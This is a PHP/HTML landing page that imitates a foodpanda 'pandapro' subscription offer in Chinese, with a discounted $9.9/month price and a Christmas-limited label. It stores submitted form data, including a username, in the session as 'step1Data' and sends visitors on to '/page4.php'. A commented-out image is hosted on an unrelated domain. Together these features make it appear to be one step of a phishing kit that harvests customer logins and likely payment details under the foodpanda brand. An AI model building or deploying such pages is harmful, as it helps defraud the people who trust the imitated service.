<?php

session_start();

//require_once 'config.php';

//include('partials/header.php');

#include('header-him-banner.php');





if (isset($_POST['submit']) || isset($_POST['username'])) {

    $_SESSION['step1Data'] = $_POST;
}

include('header-him.php');



?>

<meta name="viewport" content="width=device-width, initial-scale=1" />

<!-- Latest compiled and minified CSS -->

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">



<!-- jQuery library -->

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>



<!-- Latest compiled JavaScript -->

<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">



<style>
    body {

        /*background-image: url('https://pa.ctmei.link/images/panda.png');*/

        background-size: cover;

        background-repeat: no-repeat;

        height: 100vh;

        margin: 0;



        align-items: center;

        justify-content: center;

    }



    h1 {

        color: white;

        font-family: 'Arial', sans-serif;

    }

    .col-lg-12 img {

        width: 100%;
        /* Make the image fill the entire width of the column */

        height: auto;
        /* Maintain the image's aspect ratio */

        max-width: 100%;
        /* Ensure the image doesn't exceed its original size */

        display: block;
        /* Remove extra space beneath the image */

        margin: auto;
        /* Center the image within the column */

    }



    .red-check {

        color: red;

        font-size: large;

    }



    .form_title {

        font-weight: bolder;

    }

    .form_dis {

        font-size: 24px;

    }

    .btn-success {

        color: #fff;

        background-color: #FD2C84;

        border-color: white;

        border-radius: 10px;

        width: 60%;

        height: 40px;

    }

    .btn-success:hover,
    .btn-success:focus,
    .btn-success:active,
    .btn-success.active,
    .open>.dropdown-toggle.btn-success {

        color: #fff;

        background-color: #FD2C84;

        border-color: white;

        border-radius: 10px;

        width: 60%;

        height: 60px;

    }

    .float-none:hover,
    .float-none:focus,
    .float-none:active,
    .float-none.active {

        background-color: #FD2C84 !important;

        height: 40px;

        border-color: #FD2C84 !important;

        box-shadow: unset !important;

    }

    .h3,
    h3 {

        font-size: 26px;

    }

    .floating-button {

        position: fixed;

        bottom: 0;

        background: #fff;

        width: 100%;

        left: 0;

        box-shadow: 0 -8px 42px -40px #000;

        z-index: 9;

    }

    body {

        margin-bottom: 14rem;

        height: auto;

    }



    .image-content .row {

        margin: 0 !important;

    }



    .image-content .row .col-sm-12 {

        max-width: 670px;

        margin: 0 auto;

        float: none;

        display: flex;

    }



    .image-content .row .col-sm-12 .col-sm-6 {

        width: auto;

        margin-left: auto;

    }



    .image-content .row .col-sm-12 .col-sm-6:first-child {

        margin-left: 0;

    }



    .image-content p[class*="col"] {

        width: auto;

    }



    @media (min-width: 768px) {

        #slidemenu ul li a.title {

            text-decoration: underline;

        }

    }



    @media (max-width: 767px) {

        html {

            overflow-x: hidden;

        }

        .pandapro-bar .col-lg-12 .col-sm-3 {

            width: 30%;

            max-width: 100px;

        }

        .pandapro-bar .col-lg-12 {

            display: flex;

            align-items: center;

            padding: 22px 25px;

            background: #FCF1F5;

            justify-content: center;

        }

        .pandapro-bar .col-lg-12 .col-sm-9 {

            padding: 0 0 0 20px !important;

            text-align: left !important;

            width: auto;

        }

        .pandapro-bar .col-lg-12 .col-sm-9 {

            font-size: 18px !important;

        }



        .heading {

            padding-top: 3rem;

            padding-bottom: 2px;

        }



        .floating-button .row {

            margin: 0 !important;

        }



        .floating-button .row .col-sm-12 {

            display: flex;

            padding: 10px 25px;

            padding-bottom: 10px;

            align-items: center;

        }



        .floating-button .row .col-sm-12 .col-sm-6 {

            padding: 0;

            width: auto;

            margin-left: auto;

        }



        .floating-button br {

            display: none;

        }



        .floating-button .row .col-sm-12 .col-sm-6 button.btn.btn-success {

            width: auto;

        }



        .floating-button .row .col-sm-12 .col-sm-6:first-child {

            margin-left: 0;

        }



        .heading p {

            font-size: 2.6rem !important;

        }

        .image-content .row .col-sm-12 {

            display: flex;

            align-items: center;

        }

        .image-content .row .col-sm-12 .col-sm-6:first-child {

            margin-left: 0;

            width: auto;

            padding-right: 30px;

        }

        .image-content .row h3.form_title {

            font-size: 18px;

        }

        .image-content .row p.form_dis {

            font-size: 16px;

            text-indent: -14px;

        }

        .image-content .row .col-sm-12 .col-sm-6 img {

            width: 100%;

        }

        .image-content .row .col-sm-12 .col-sm-6 {

            width: 100px;

            margin-left: auto;

            padding: 0;

        }

        .image-content p.button-shape {

            font-size: 17px !important;

            display: inline-block;

            text-indent: -17px;

            background: #FCF1F5 !important;

            color: #FD2C84 !important;

        }

    }
</style>





<div class="row">

    <div class="col-lg-12">

        <img src="/PA/images/panda.png" alt="">

    </div>

</div>



<div class="pandapro-bar">

    <div class="row">

        <div class="col-lg-12">

            <div class="col-sm-3" style="padding:0px;">

                <img src="/PA/images/ico_n.jpg" alt="">

            </div>

            <div class="col-sm-9" style="background-color: #FCF1F5; padding: 65px; font-size: 30px;/*xxx-large;*/ text-align: center; color:FD2C84;">

                <b>pandapro 推薦給最懂生活的你</b>

                <br>

                訂閱費限時半價 , 享受無限次免費外送、指

                <br>

                定餐廳專屬優惠等 , 享受生活、立即訂閱 !

                <!--<p style="background-color: #FCF1F5; padding: 20px;"> Add your Content here</p>!-->

            </div>

            <!-- Your content goes here -->

        </div>

    </div>

</div>



<div class="heading">

    <div class="row">

        <div class="col-lg-12">

            <p style="font-weight:bold; font-size: xxx-large; text-align: center;">成為pandapro,現享獨家優惠</p>

        </div>

    </div>

</div>



<div class="image-content">

    <div class="row" style="margin-left:80px;">

        <div class="col-sm-12">

            <div class="col-sm-6">

                <h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;Pandapro 歡迎券</h3>

                <p class="form_dis">&nbsp;&nbsp;&nbsp;3張七折通用折扣券-用於滿100$以上的任意訂單</p>

                <p class="col-sm-5 button-shape" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 24px;">&nbsp;&nbsp;&nbsp;聖誕限時</p>



            </div>

            <div class="col-sm-6">

                <img src="/PA/images/1.png" alt="">

            </div>

        </div>

    </div>

</div>





<div class="image-content">

    <div class="row" style="margin-left:80px;">

        <div class="col-sm-12">

            <div class="col-sm-6">

                <h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;無限次免運費</h3>

                <p class="form_dis">&nbsp;&nbsp;&nbsp;通用於滿79$以上的美食生鮮雜貨訂單</p>

                <p class="col-sm-7 button-shape" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 24px;">&nbsp;&nbsp;&nbsp;無限次數</p>

            </div>



            <div class="col-sm-6">

                <img src="/PA/images/2.png" alt="">

            </div>

        </div>

    </div>

</div>





<div class="image-content">

    <div class="row" style="margin-left:80px;">

        <div class="col-sm-12">

            <div class="col-sm-6">

                <h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;堂食75折</h3>

                <p class="form_dis">&nbsp;&nbsp;&nbsp;出街食飯？指定餐廳單點餐牌享低至75折.</p>

                <p class="col-sm-5 button-shape" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 24px;">&nbsp;&nbsp;&nbsp;無限次數</p>



            </div>



            <div class="col-sm-6">

                <img src="/PA/images/1.png" alt="">

            </div>

        </div>

    </div>

</div>



<div class="image-content">

    <div class="row" style="margin-left:80px;">

        <div class="col-sm-12">

            <div class="col-sm-6">

                <h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;外賣自取95折</h3>

                <p class="form_dis">&nbsp;&nbsp;&nbsp;人氣餐廳包括：百份百餐廳、手作功夫茶及更多</p>

                <p class="col-sm-5 button-shape" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 24px;">&nbsp;&nbsp;&nbsp;無限次數</p>



            </div>



            <div class="col-sm-6">

                <img src="/PA/images/4.png" alt="">

            </div>

        </div>

    </div>

</div>



<div class="image-content">

    <div class="row" style="margin-left:80px;">

        <div class="col-sm-12">

            <div class="col-sm-6">

                <h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;生鮮雜貨5%折扣</h3>

                <p class="form_dis">&nbsp;&nbsp;&nbsp;適用於所有生鮮雜貨店家,每月5張優惠券慳多啲！</p>

                <p class="col-sm-8 button-shape" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 24px;">&nbsp;&nbsp;&nbsp;每月5張優惠券</p>



            </div>



            <div class="col-sm-6">

                <img src="/PA/images/5.png" alt="">

            </div>

        </div>

    </div>

</div>





<div class="image-content">

    <div class="row" style="margin-left:80px;">

        <div class="col-sm-12">

            <div class="col-sm-6">

                <h3 class="form_title"><i class="fas fa-check-circle red-check"></i>&nbsp;更多獨家優惠</h3>

                <p class="form_dis">&nbsp;&nbsp;&nbsp;享受各項pandamart、foodpanda mall及各大品牌禮遇！</p>

                <p class="col-sm-7 button-shape" style="background-color:lavender;color: cornflowerblue;font-weight: bold; border-radius: 25px; font-size: 24px;">&nbsp;&nbsp;&nbsp;無限次數</p>



            </div>



            <div class="col-sm-6">

                <img src="/PA/images/6.png" alt="">

            </div>

        </div>

    </div>

</div>



<div class="floating-button">

    <div class="row" style="margin-left:80px;">

        <br><br>

        <div class="col-sm-12">

            <div class="col-sm-6" style="display: flex;">

                <p style="font-size: 20px;margin-right: 6px;margin-bottom: 0"><s>$99/月</s></p>

                <p style="font-weight:bold; font-size: 20px;margin-bottom: 0">$9.9/月</p>

            </div>



            <div class="col-sm-6">

                <a style="color:#ffffff" href="/page4.php"><button type="button" class="float-none btn btn-success">立即訂閱方案</button></a>

            </div>

        </div>

    </div>

</div>



<?php include('footer-him.php'); ?>







<!--

   <div class="wrap only_mobile">



       <div id="leftdata" style="height:26em;">

       <h3 class="form_title">Welcome voucher</h3>

       <p class="form_dis">RM15 off on orders above RM40</p>



         <p style="margin-top:12pt; margin-left:24.95pt; text-align:justify; line-height:12.2pt">

           <span style="font-family:Calibri; font-size:10pt">1</span>

           <span style="font-family:Calibri; font-size:10pt; letter-spacing:0.35pt"></span>

           <span style="font-family:Calibri; font-size:10pt">voucher</span>

         </p>



        </div>



       <div id="rightdata" style="height:26em;">

           <div>

               <img src="/PA/images/1.png" alt="">

           </div>

       </div>









       <div id="leftdata" style="height:26em;">

       <h3 class="form_title">Free delivery</h3>

       <p class="form_dis">On all orders above RM 25</p>



         <p style="margin-top:10.1pt; margin-left:24.95pt; text-align:justify; line-height:14.6pt">

           <span style="font-family:Calibri; letter-spacing:0.05pt">12orders/month</span>

         </p>

       </div>



       <div id="rightdata" style="height:26em;">

           <div>

               <img src="/PA/images/2.png" alt="">

           </div>

       </div>







       <div id="leftdata" style="height:26em;">

       <h3 class="form_title">15% off and up on restaurants</h3>

       <p class="form_dis">Valid for 10000+ restaurants</p>



         <p style="margin-top:11.45pt; margin-left:24.95pt; text-align:justify; line-height:12.2pt">

           <span style="font-family:Calibri; font-size:10pt">Unlimited</span>

         </p>

       </div>



       <div id="rightdata" style="height:26em;">

           <div>

               <img src="/PA/images/1.png" alt="">

           </div>

       </div>







       <div id="leftdata" style="height:26em;">

       <h3 class="form_title">Extra 5% off pick-up</h3>

       <p class="form_dis">Valid for all pick-up orders</p>



         <p style="margin-top:11.45pt; margin-left:24.95pt; text-align:justify; line-height:12.2pt">

           <span style="font-family:Calibri; font-size:10pt">Unlimited</span>

         </p>



       </div>



       <div id="rightdata" style="height:26em;">

           <div>

               <img src="/PA/images/4.png" alt="">

           </div>

       </div>









       <div id="leftdata" style="height:26em;">

       <h3 class="form_title">20% off shops</h3>

       <p class="form_dis">Valid for all shops on orders above RM45</p>



         <p style="margin-top:11.55pt; margin-left:24.45pt; text-align:justify; line-height:14.6pt">

           <span style="font-family:Calibri; letter-spacing:0.1pt">2vouchers/month</span>

         </p>

       </div>



       <div id="rightdata" style="height:26em;">

           <div>

               <img src="/PA/images/5.png" alt="">

           </div>

       </div>







       <div id="leftdata" style="height:26em;">

       <h3 class="form_title">Dine-in offers</h3>

       <p class="form_dis">Valid on all participating restaurants</p>



         <p style="margin-top:12.95pt; margin-left:24.45pt; text-align:justify; line-height:12.2pt">

           <span style="font-family:Calibri; font-size:10pt">Available</span>

           <span style="font-family:Calibri; font-size:10pt; letter-spacing:4.85pt"></span>

           <span style="font-family:Calibri; font-size:10pt">now</span>

         </p>

       </div>



       <div id="rightdata" style="height:26em;">

           <div>

               <img src="/PA/images/6.png" alt="">

           </div>

       </div>



   </div>

   -->



<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<?php

#include('footer-him.php');
